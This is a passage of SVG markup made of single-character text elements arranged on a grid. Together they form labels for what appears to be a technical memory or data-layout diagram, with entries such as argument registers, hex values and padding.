style="font-size:1em">t</text><text text-anchor="middle" x="336" y="100" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="336" y="116" fill="currentcolor" style="font-size:1em">*</text><text text-anchor="middle" x="336" y="148" fill="currentcolor" style="font-size:1em">v</text><text text-anchor="middle" x="336" y="164" fill="currentcolor" style="font-size:1em">k</text><text text-anchor="middle" x="336" y="196" fill="currentcolor" style="font-size:1em">v</text><text text-anchor="middle" x="336" y="212" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="336" y="244" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="336" y="292" fill="currentcolor" style="font-size:1em">v</text><text text-anchor="middle" x="336" y="308" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="336" y="340" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="336" y="436" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="336" y="484" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="336" y="532" fill="currentcolor" style="font-size:1em">F</text><text text-anchor="middle" x="336" y="580" fill="currentcolor" style="font-size:1em">R</text><text text-anchor="middle" x="344" y="52" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="344" y="68" fill="currentcolor" style="font-size:1em">*</text><text text-anchor="middle" x="344" y="100" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="344" y="148" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="344" y="164" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="344" y="196" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="344" y="212" fill="currentcolor" style="font-size:1em">m</text><text text-anchor="middle" x="344" y="244" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="344" y="292" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="344" y="340" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="344" y="436" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="344" y="484" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="344" y="532" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="344" y="580" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="352" y="52" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="352" y="100" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="352" y="116" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="352" y="148" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="352" y="164" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="352" y="196" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="352" y="212" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="352" y="244" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="352" y="292" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="352" y="308" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="352" y="340" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="352" y="436" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="352" y="484" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="352" y="532" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="352" y="580" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="360" y="68" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="360" y="116" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="360" y="148" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="360" y="164" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="360" y="196" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="360" y="212" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="360" y="244" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="360" y="292" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="360" y="308" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="360" y="340" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="360" y="436" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="360" y="484" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="360" y="532" fill="currentcolor" style="font-size:1em">m</text><text text-anchor="middle" x="360" y="580" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="368" y="52" fill="currentcolor" style="font-size:1em">A</text><text text-anchor="middle" x="368" y="68" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="368" y="100" fill="currentcolor" style="font-size:1em">A</text><text text-anchor="middle" x="368" y="116" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="368" y="148" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="368" y="196" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="368" y="212" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="368" y="244" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="368" y="292" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="368" y="308" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="368" y="340" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="368" y="436" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="368" y="484" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="368" y="532" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="368" y="580" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="376" y="52" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="376" y="68" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="376" y="100" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="376" y="116" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="376" y="148" fill="currentcolor" style="font-size:1em">b</text><text text-anchor="middle" x="376" y="164" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="376" y="196" fill="currentcolor" style="font-size:1em">b</text><text text-anchor="middle" x="376" y="212" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="376" y="244" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="376" y="292" fill="currentcolor" style="font-size:1em">b</text><text text-anchor="middle" x="376" y="308" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="376" y="340" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="376" y="436" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="376" y="484" fill="currentcolor" style="font-size:1em">y</text><text text-anchor="middle" x="376" y="580" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="384" y="52" fill="currentcolor" style="font-size:1em">g</text><text text-anchor="middle" x="384" y="68" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="384" y="100" fill="currentcolor" style="font-size:1em">g</text><text text-anchor="middle" x="384" y="116" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="384" y="148" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="384" y="164" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="384" y="196" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="384" y="212" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="384" y="292" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="384" y="308" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="384" y="532" fill="currentcolor" style="font-size:1em">P</text><text text-anchor="middle" x="392" y="52" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="392" y="68" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="392" y="100" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="392" y="116" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="392" y="148" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="392" y="164" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="392" y="196" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="392" y="212" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="392" y="244" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="392" y="292" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="392" y="308" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="392" y="340" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="392" y="436" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="392" y="532" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="392" y="580" fill="currentcolor" style="font-size:1em">A</text><text text-anchor="middle" x="400" y="52" fill="currentcolor" style="font-size:1em">m</text><text text-anchor="middle" x="400" y="68" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="400" y="100" fill="currentcolor" style="font-size:1em">m</text><text text-anchor="middle" x="400" y="116" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="400" y="212" fill="currentcolor" style="font-size:1em">[</text><text text-anchor="middle" x="400" y="244" fill="currentcolor" style="font-size:1em">f</text><text text-anchor="middle" x="400" y="308" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="400" y="340" fill="currentcolor" style="font-size:1em">f</text><text text-anchor="middle" x="400" y="436" fill="currentcolor" style="font-size:1em">f</text><text text-anchor="middle" x="400" y="532" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="400" y="580" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="408" y="52" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="408" y="100" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="408" y="116" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="408" y="164" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="408" y="212" fill="currentcolor" style="font-size:1em">M</text><text text-anchor="middle" x="408" y="308" fill="currentcolor" style="font-size:1em">[</text><text text-anchor="middle" x="408" y="532" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="408" y="580" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="416" y="52" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="416" y="100" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="416" y="116" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="416" y="164" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="416" y="212" fill="currentcolor" style="font-size:1em">A</text><text text-anchor="middle" x="416" y="244" fill="currentcolor" style="font-size:1em">b</text><text text-anchor="middle" x="416" y="308" fill="currentcolor" style="font-size:1em">M</text><text text-anchor="middle" x="416" y="340" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="416" y="436" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="416" y="532" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="416" y="580" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="424" y="52" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="424" y="100" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="424" y="212" fill="currentcolor" style="font-size:1em">X</text><text text-anchor="middle" x="424" y="244" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="424" y="308" fill="currentcolor" style="font-size:1em">A</text><text text-anchor="middle" x="424" y="340" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="424" y="436" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="424" y="532" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="424" y="580" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="432" y="164" fill="currentcolor" style="font-size:1em">b</text><text text-anchor="middle" x="432" y="212" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="432" y="244" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="432" y="308" fill="currentcolor" style="font-size:1em">X</text><text text-anchor="middle" x="432" y="340" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="432" y="436" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="432" y="532" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="432" y="580" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="440" y="52" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="440" y="100" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="440" y="164" fill="currentcolor" style="font-size:1em">y</text><text text-anchor="middle" x="440" y="212" fill="currentcolor" style="font-size:1em">O</text><text text-anchor="middle" x="440" y="244" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="440" y="308" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="440" y="340" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="440" y="436" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="440" y="580" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="448" y="52" fill="currentcolor" style="font-size:1em">S</text><text text-anchor="middle" x="448" y="100" fill="currentcolor" style="font-size:1em">S</text><text text-anchor="middle" x="448" y="164" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="448" y="212" fill="currentcolor" style="font-size:1em">P</text><text text-anchor="middle" x="448" y="308" fill="currentcolor" style="font-size:1em">O</text><text text-anchor="middle" x="448" y="340" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="448" y="436" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="448" y="532" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="456" y="52" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="456" y="100" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="456" y="164" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="456" y="212" fill="currentcolor" style="font-size:1em">S</text><text text-anchor="middle" x="456" y="244" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="456" y="308" fill="currentcolor" style="font-size:1em">P</text><text text-anchor="middle" x="456" y="340" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="456" y="436" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="456" y="532" fill="currentcolor" style="font-size:1em">S</text><text text-anchor="middle" x="456" y="580" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="464" y="52" fill="currentcolor" style="font-size:1em">v</text><text text-anchor="middle" x="464" y="100" fill="currentcolor" style="font-size:1em">v</text><text text-anchor="middle" x="464" y="164" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="464" y="212" fill="currentcolor" style="font-size:1em">]</text><text text-anchor="middle" x="464" y="244" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="464" y="308" fill="currentcolor" style="font-size:1em">S</text><text text-anchor="middle" x="464" y="340" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="464" y="436" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="464" y="532" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="464" y="580" fill="currentcolor" style="font-size:1em">S</text><text text-anchor="middle" x="472" y="52" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="472" y="100" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="472" y="164" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="472" y="244" fill="currentcolor" style="font-size:1em">m</text><text text-anchor="middle" x="472" y="308" fill="currentcolor" style="font-size:1em">]</text><text text-anchor="middle" x="472" y="340" fill="currentcolor" style="font-size:1em">[</text><text text-anchor="middle" x="472" y="436" fill="currentcolor" style="font-size:1em">[</text><text text-anchor="middle" x="472" y="532" fill="currentcolor" style="font-size:1em">v</text><text text-anchor="middle" x="472" y="580" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="480" y="52" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="480" y="100" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="480" y="212" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="480" y="244" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="480" y="340" fill="currentcolor" style="font-size:1em">M</text><text text-anchor="middle" x="480" y="436" fill="currentcolor" style="font-size:1em">M</text><text text-anchor="middle" x="480" y="532" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="480" y="580" fill="currentcolor" style="font-size:1em">v</text><text text-anchor="middle" x="488" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="488" y="244" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="488" y="308" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="488" y="340" fill="currentcolor" style="font-size:1em">A</text><text text-anchor="middle" x="488" y="436" fill="currentcolor" style="font-size:1em">A</text><text text-anchor="middle" x="488" y="532" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="488" y="580" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="496" y="52" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="496" y="100" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="496" y="212" fill="currentcolor" style="font-size:1em">6</text><text text-anchor="middle" x="496" y="244" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="496" y="308" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="496" y="340" fill="currentcolor" style="font-size:1em">X</text><text text-anchor="middle" x="496" y="436" fill="currentcolor" style="font-size:1em">X</text><text text-anchor="middle" x="496" y="580" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="504" y="52" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="504" y="100" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="504" y="244" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="504" y="308" fill="currentcolor" style="font-size:1em">6</text><text text-anchor="middle" x="504" y="340" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="504" y="436" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="504" y="532" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="512" y="212" fill="currentcolor" style="font-size:1em">×</text><text text-anchor="middle" x="512" y="244" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="512" y="340" fill="currentcolor" style="font-size:1em">O</text><text text-anchor="middle" x="512" y="436" fill="currentcolor" style="font-size:1em">O</text><text text-anchor="middle" x="512" y="532" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="512" y="580" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="520" y="52" fill="currentcolor" style="font-size:1em">=</text><text text-anchor="middle" x="520" y="100" fill="currentcolor" style="font-size:1em">=</text><text text-anchor="middle" x="520" y="244" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="520" y="308" fill="currentcolor" style="font-size:1em">×</text><text text-anchor="middle" x="520" y="340" fill="currentcolor" style="font-size:1em">P</text><text text-anchor="middle" x="520" y="436" fill="currentcolor" style="font-size:1em">P</text><text text-anchor="middle" x="520" y="580" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="528" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="528" y="244" fill="currentcolor" style="font-size:1em">[</text><text text-anchor="middle" x="528" y="340" fill="currentcolor" style="font-size:1em">S</text><text text-anchor="middle" x="528" y="436" fill="currentcolor" style="font-size:1em">S</text><text text-anchor="middle" x="528" y="532" fill="currentcolor" style="font-size:1em">=</text><text text-anchor="middle" x="536" y="52" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="536" y="100" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="536" y="244" fill="currentcolor" style="font-size:1em">M</text><text text-anchor="middle" x="536" y="308" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="536" y="340" fill="currentcolor" style="font-size:1em">]</text><text text-anchor="middle" x="536" y="436" fill="currentcolor" style="font-size:1em">]</text><text text-anchor="middle" x="536" y="580" fill="currentcolor" style="font-size:1em">=</text><text text-anchor="middle" x="544" y="52" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="544" y="100" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="544" y="212" fill="currentcolor" style="font-size:1em">b</text><text text-anchor="middle" x="544" y="244" fill="currentcolor" style="font-size:1em">A</text><text text-anchor="middle" x="544" y="532" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="552" y="52" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="552" y="100" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="552" y="212" fill="currentcolor" style="font-size:1em">y</text><text text-anchor="middle" x="552" y="244" fill="currentcolor" style="font-size:1em">X</text><text text-anchor="middle" x="552" y="308" fill="currentcolor" style="font-size:1em">b</text><text text-anchor="middle" x="552" y="532" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="552" y="580" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="560" y="52" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="560" y="100" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="560" y="212" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="560" y="244" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="560" y="308" fill="currentcolor" style="font-size:1em">y</text><text text-anchor="middle" x="560" y="532" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="560" y="580" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="568" y="212" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="568" y="244" fill="currentcolor" style="font-size:1em">O</text><text text-anchor="middle" x="568" y="308" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="568" y="580" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="576" y="212" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="576" y="244" fill="currentcolor" style="font-size:1em">P</text><text text-anchor="middle" x="576" y="308" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="584" y="212" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="584" y="244" fill="currentcolor" style="font-size:1em">S</text><text text-anchor="middle" x="584" y="308" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="592" y="244" fill="currentcolor" style="font-size:1em">]</text><text text-anchor="middle" x="592" y="308" fill="currentcolor" style="font-size:1em">)</text><text text-anchor="middle" x="616" y="132" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="624" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="624" y="164" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="624" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="624" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="632" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="632" y="164" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="632" y="212" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="632" y="260" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="640" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="640" y="164" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="640" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="640" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="648" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="648" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="648" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="656" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="664" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="672" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="680" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="680" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="680" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="688" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="688" y="212" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="688" y="260" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="696" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="696" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="696" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="704" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="704" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="704" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="712" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="720" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="728" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="736" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="736" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="736" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="744" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="744" y="212" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="744" y="260" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="752" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="752" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="752" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="760" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="760" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="760" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="768" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="776" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="784" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="792" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="792" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="792" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="800" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="800" y="212" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="800" y="260" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="808" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="808" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="808" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="816" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="816" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="816" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="824" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="832" y="132" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="840" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="848" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="848" y="164" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="848" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="848" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="856" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="856" y="164" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="856" y="212" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="856" y="260" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="864" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="864" y="164" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="864" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="864" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="872" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="872" y="164" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="872" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="872" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="880" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="880" y="164" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="888" y="132" 